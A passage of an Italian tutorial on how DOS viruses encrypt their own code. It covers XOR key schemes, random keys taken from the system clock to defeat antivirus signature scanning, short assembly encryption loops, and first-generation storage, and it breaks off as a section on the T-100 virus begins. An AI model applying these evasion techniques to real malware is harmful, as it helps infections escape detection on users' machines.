"MS Mincho";color:green'>Lo scopo della crittografia, come si è detto, è quello
di nascondere del codice eseguibile. Questo può essere effettuato mediante una
semplice operazione logica applicata ad ogni bytes del codice virale. Questa
operazione è un XOR che può essere utilizzato per crittografare e decrittografare
i bytes del virus.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'>Vediamo un attimo come lavora l’XOR. La tabella di
verità per XOR è:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:Courier;mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Times New Roman";color:green'><span
style="mso-spacerun: yes">                    </span></span></b><b><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:Courier;
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Times New Roman"'>XOR<span
style="mso-spacerun: yes">   </span>0<span style="mso-spacerun: yes">  
</span>1<span style="mso-spacerun: yes">     </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:Courier;mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Times New Roman"'><span style="mso-spacerun:
yes">                     </span>0<span style="mso-spacerun: yes">   
</span>0<span style="mso-spacerun: yes">   </span>1<span style="mso-spacerun:
yes">     </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:Courier;mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Times New Roman"'><span style="mso-spacerun:
yes">                     </span>1<span style="mso-spacerun: yes">   
</span>1<span style="mso-spacerun: yes">   </span>0<span style="mso-spacerun:
yes">  </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:Courier;mso-fareast-font-family:"MS Mincho";
mso-bidi-font-family:"Times New Roman";color:green'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'>Consideriamo l’istruzione:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal><b style='mso-bidi-font-weight:normal'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:Courier'><span
style="mso-spacerun: yes">    </span>MOV ax, 1234h<span style="mso-spacerun:
yes">    </span><o:p></o:p></span></b></p>

<p class=MsoNormal><b style='mso-bidi-font-weight:normal'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:Courier;
color:green'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoNormal><span style='color:green;mso-bidi-font-weight:bold'>la sua
codifica in esadecimale sarà: </span><b style='mso-bidi-font-weight:normal'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:Courier;
color:green'>B83412, </span></b><span style='color:green;mso-bidi-font-weight:
bold'>mentre la sua codifica in binario sarà:<o:p></o:p></span></p>

<p class=MsoNormal><span style='color:green;mso-bidi-font-weight:bold'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal><b style='mso-bidi-font-weight:normal'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:Courier'><span
style="mso-spacerun: yes">    </span>10111000 00110100 00010010<o:p></o:p></span></b></p>

<p class=MsoNormal><b style='mso-bidi-font-weight:normal'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:Courier;
color:green'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'>Il PC vedrà l’istruzione di cui sopra proprio in
questo modo. <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'>Ora, se noi eseguiamo un XOR sui bytes costituenti
l’istruzione, con un valore arbitrario, poniamo 9Bh (decimale = 155, binario
10011011) byte per byte, avremo:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal><b style='mso-bidi-font-weight:normal'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:Courier'><span
style="mso-spacerun: yes">    </span>10111000<span style="mso-spacerun: yes"> 
</span>00110100<span style="mso-spacerun: yes">  </span>00010010<span
style="mso-spacerun: yes">    </span>bytes da crittografare<span
style="mso-spacerun: yes">    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-family:
Courier;mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Times New Roman"'>XOR
10011011<span style="mso-spacerun: yes">  </span>10011011<span
style="mso-spacerun: yes">  </span>10011011<span style="mso-spacerun: yes">   
</span>valore arbitrario (chiave) <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-family:
Courier;mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Times New Roman"'><span
style="mso-spacerun: yes">    </span>----------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-family:
Courier;mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Times New Roman"'><span
style="mso-spacerun: yes">    </span>00100011<span style="mso-spacerun: yes"> 
</span>10101111<span style="mso-spacerun: yes">  </span>10001001<span
style="mso-spacerun: yes">   </span>bytes crittografati<span
style="mso-spacerun: yes">  </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-family:
Courier;mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Times New Roman";
color:green'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'>Ora, i bytes crittografati in esadecimale risultano
uguali a 23h AFh 89h, che non significano nulla. Tuttavia se noi eseguiamo un
successivo XOR ai bytes crittografati con il medesimo valore 9Bh, otteniamo:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-family:
Courier;mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Times New Roman"'><span
style="mso-spacerun: yes">    </span>00100011<span style="mso-spacerun: yes"> 
</span>10101111<span style="mso-spacerun: yes">  </span>10001001<span
style="mso-spacerun: yes">   </span>bytes crittografati<span
style="mso-spacerun: yes">         </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-family:
Courier;mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Times New Roman"'>XOR
10011011<span style="mso-spacerun: yes">  </span>10011011<span
style="mso-spacerun: yes">  </span>10011011<span style="mso-spacerun: yes">  
</span>valore arbitrario (chiave)<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-family:
Courier;mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Times New Roman"'><span
style="mso-spacerun: yes">    </span>----------------------------<span
style="mso-spacerun: yes">  </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-family:
Courier;mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Times New Roman"'><span
style="mso-spacerun: yes">    </span>10111000<span style="mso-spacerun: yes"> 
</span>00110100<span style="mso-spacerun: yes">  </span>00010010<span
style="mso-spacerun: yes">   </span>bytes decrittografati<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-family:
Courier;mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Times New Roman";
color:green'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'>Che sono esattamente i bytes dell’istruzione
originaria.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'>Questo è il meccanismo che sta alla base della
crittografia. Ora interessiamoci di quel valore, a cui noi abbiamo assegnato
9Bh, e che abbiamo definito arbitrario. In realtà questo valore è la chiave che
noi utilizziamo per crittografare il codice. Come tale, una volta usata per
crittografare il codice, deve essere conservata da qualche parte per poter
essere poi riutilizzata nella fase di decrittografazione. Come vedremo negli
esempi, questo è quanto fanno i virus.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'>Tuttavia, c’è un problema costituito dall’identità di
questa chiave. Se un virus utilizzasse sempre lo stesso valore per
crittografare le copie virali che poi verranno inserite nei vari ospiti, il
codice virale di queste copie, sebbene crittografato, conterrebbe dei bytes di
valore costante che potrebbero essere facilmente localizzati da una generica
scansione AV.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'>Un metodo utilizzato dai vwriters è quello di
assegnare alla chiave un valore casuale, ricavato dalla chiamata interrupt
dell’ora del sistema:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-family:
Courier;mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Times New Roman"'><span
style="mso-spacerun: yes">              </span><span style="mso-spacerun:
yes">              </span></span></b><b><span lang=EN-US style='font-family:
Courier;mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Times New Roman";
mso-ansi-language:EN-US'>mov AH, 2Ch<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='font-family:Courier;mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:
"Times New Roman";mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                            </span>int 21h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='font-family:Courier;mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:
"Times New Roman";mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                            </span></span></b><b><span style='font-family:
Courier;mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Times New Roman"'>mov
chiave, DL<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'>Dalla documentazione DOS ricaviamo che la chiamata 2Ch
dell’INT21h richiede il “time” del sistema. La funzione 2Ch ritorna in CH le
ore, in CL i minuti, in DH i secondi e in DL i centesimi di secondo. In questo
caso come chiave viene scelto un valore di un byte corrispondente ai centesimi.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'>Molti virus crittografati utilizzano la stessa routine
per crittografare e decrittografare il codice. Cio’ è possibilie utilizzando
l’operazione XOR, la più comunemente usata. Esistono altre operazioni
utilizzate dai vwriters: NOT e NEG; in genere è più usata la prima.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'>Altre coppie di istruzione per la crittografazione e
decrittografazione sono: INC/DEC, ADD/SUB, ROL/ROR, MUL/DIV, ADC/SBB…<o:p></o:p></span></p>

<p class=MsoPlainText><span style='mso-fareast-font-family:"MS Mincho";
color:green'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText><span style='mso-fareast-font-family:"MS Mincho";
color:green'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<h1><a name="_3._la_routine"></a><span style='mso-fareast-font-family:"MS Mincho";
color:red;mso-ansi-language:IT'>3. la routine di crittografazione<o:p></o:p></span></h1>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:red'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'>Per modificare il proprio codice il virus
crittografato necessita di una routine di crittografazione/decrittografazione.
Vediamo più da vicino questa routine. Un esempio di una simile routine potrebbe
essere il seguente:<o:p></o:p></span></p>

<p class=MsoPlainText><span style='mso-fareast-font-family:"MS Mincho";
color:green'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><span
style="mso-spacerun: yes"> </span>crittazione:<span style="mso-spacerun:
yes">        </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><span
style="mso-spacerun: yes">        </span>mov<span style="mso-spacerun:
yes">     </span>cx,bytes_da_crittare<span style="mso-spacerun: yes">   
</span>; fine_encrypt-inizio_encrypt<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><span
style="mso-spacerun: yes">        </span>mov<span style="mso-spacerun:
yes">     </span>di,[bp+critta_da_qui]<span style="mso-spacerun: yes">  
</span>; From where<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><span
style="mso-spacerun: yes">        </span>mov<span style="mso-spacerun:
yes">     </span>si,di<span style="mso-spacerun: yes">                  
</span>; per lodsb/stosb<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><span
style="mso-spacerun: yes">        </span>mov<span style="mso-spacerun:
yes">     </span>ah,chiave<span style="mso-spacerun: yes">  </span><span
style="mso-spacerun: yes">             </span>; AH = chiave<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><span
style="mso-spacerun: yes"> </span>ciclo_crittazione:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><span
style="mso-spacerun: yes">        </span>lodsb<span style="mso-spacerun:
yes">                           </span>; Muove una byte da DS:SI a AL<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><span
style="mso-spacerun: yes">        </span>xor<span style="mso-spacerun:
yes">     </span>al,ah<span style="mso-spacerun: yes">                  
</span>; critta il byte<span style="mso-spacerun: yes">  </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><span
style="mso-spacerun: yes">        </span>stosb<span style="mso-spacerun:
yes">                           </span>; Muove un byte da AL a ES:DI<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><span
style="mso-spacerun: yes">        </span>loop<span style="mso-spacerun:
yes">    </span>ciclo_crittazione<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><span
style="mso-spacerun: yes">        </span>ret<o:p></o:p></span></b></p>

<p class=MsoPlainText><span style='mso-fareast-font-family:"MS Mincho";
color:green'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'>La routine è molto semplice. Inizialmente viene
inserito il numero di bytes da crittare (calcolati con una semplice sottrazione
tra due label opportunamente posizionate nel codice virale) in cx. Quindi viene
inserito in DI l’indirizzo da cui deve partire l’operazione di modifica dei
bytes. Dopo aver memorizzato la chiave (ricavata come sopra) in AH, si entra
nel ciclo di crittazione vero e proprio: questo consiste nel prendere un byte
alla volta dall’indirizzo puntato da DI, crittografarlo e salvarlo nello stesso
punto. Alla fine del ciclo tutto il codice da critta_da_qui a fine_encrypt
risulterà crittografato.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'>Questa procedura è molto semplice: esistono solo 255
possibilità di mutazione del codice essendo la chiave di soli 8 bit.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'>Con una chiave a 16 bit la routine di crittazione è:<o:p></o:p></span></p>

<p class=MsoPlainText><span style='mso-fareast-font-family:"MS Mincho";
color:green'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><span
style="mso-spacerun: yes"> </span>crittazione:<span style="mso-spacerun:
yes">        </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><span
style="mso-spacerun: yes">        </span>mov<span style="mso-spacerun:
yes">     </span>cx,(bytes <i>da</i>crittare+1)/2<span style="mso-spacerun:
yes">   </span>; fine_encrypt-inizio_encrypt/2<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><span
style="mso-spacerun: yes">        </span>mov<span style="mso-spacerun:
yes">     </span>di,[bp+critta_da_qui]<span style="mso-spacerun: yes">      
</span>; da qui<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><span
style="mso-spacerun: yes">        </span>mov<span style="mso-spacerun:
yes">     </span>si,di<span style="mso-spacerun: yes">               </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><span
style="mso-spacerun: yes">  </span><span style="mso-spacerun:
yes">      </span>mov<span style="mso-spacerun: yes">     </span>dx,key<span
style="mso-spacerun: yes">         </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><span
style="mso-spacerun: yes"> </span>ciclo_crittazione:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><span
style="mso-spacerun: yes">        </span>lodsw<span style="mso-spacerun:
yes">                           </span>; Muove una word da DS:SI a AX<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><span
style="mso-spacerun: yes">        </span>xor<span style="mso-spacerun:
yes">     </span>ax,dx<span style="mso-spacerun: yes">                  
</span>; crittografa la word<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><span
style="mso-spacerun: yes">        </span>stosw<span style="mso-spacerun:
yes">                           </span>; Muove una word da AX a ES:DI<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><span
style="mso-spacerun: yes">  </span><span style="mso-spacerun:
yes">      </span>loop<span style="mso-spacerun: yes">   
</span>ciclo_crittazione<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><span
style="mso-spacerun: yes">        </span>ret<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:green'>Con
molte più possibilità di variazione.<o:p></o:p></span></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:green'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:green'>Ci
sono alcune considerazione da fare riguardo alla prima generazione dei virus
crittografati.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'>Nella prima generazione il virus non è crittato. E’
chiaro che per il suo funzionamento l virus non crittografata. Utilizzando XOR,
per la prima generazione viene di solito usato il valore 00 come chiave. La
prima volta che il virus si attiva modificherà tale valore con il valore della
chiave prescelto.<o:p></o:p></span></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:green'>Come
viene salvata una seconda copia del virus per la prima generazione ? Dopo la
label che indica l’ultimo byte che il virus copierà nell’host, si trova spesso
un’istruzione simile:<o:p></o:p></span></p>

<p class=MsoPlainText><span style='mso-fareast-font-family:"MS Mincho";
color:green'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><span
style="mso-spacerun: yes"> </span>virus_end<span style="mso-spacerun:
yes">      </span>label<span style="mso-spacerun: yes">   </span>byte<span
style="mso-spacerun: yes">            </span>; label della fine del codice
virus<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><span
style="mso-spacerun: yes"> </span></span></b><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";mso-ansi-language:EN-US'>enc_buffer<span
style="mso-spacerun: yes">     </span>db<span style="mso-spacerun: yes"> 
</span><span style="mso-spacerun: yes">    </span>(offset virus_end-offset
virus_start) dup (090h)<o:p></o:p></span></b></p>

<p class=MsoPlainText><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:green'>La
variabile enc_buffer ha il solo scopo di salvare<span style="mso-spacerun:
yes">  </span>il codice del virus per la prima generazione. Dopo la prima
generazione, questa variabile non sarà copiata con esso. <o:p></o:p></span></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:green'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:green'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<h1><a name="_4._qualche_esempio"></a><span style='mso-fareast-font-family:
"MS Mincho";color:red;mso-ansi-language:IT'>4. qualche esempio<o:p></o:p></span></h1>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:green'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'>Quelli che seguono sono esempi di virus che utilizzano
la tecnica descritta. Sono dei vecchi virus sotto DOS molto semplici, ma
senz’altro utili per un approccio alla crittografazione. <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:green'>Le istruzioni relative alla tecnica di
crittografazione, le sole commentate, sono evidenziate con</span><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho"'> <span style='color:#B32D9D'>colore
diverso.<o:p></o:p></span></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify;tab-stops:234.75pt'><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:green'><span style='mso-tab-count:
1'>                                                                              </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:red'>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:red'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<h1><a name="_1._Virus_T-100:"></a><span style='mso-fareast-font-family:"MS Mincho";
color:red;mso-ansi-language:IT'>1. Virus T-100:<o:p></o:p></span></h1>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#B32D9D'>funzionamento:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#B32D9D'>a) decritta il codice virus con chiave memorizzata
in variabile Crypt;<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#B32D9D'>b) critta il virus, crea una chiave per la nuova
infezione, e salva tutto nel l’host-RAM (usato come buffer)<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
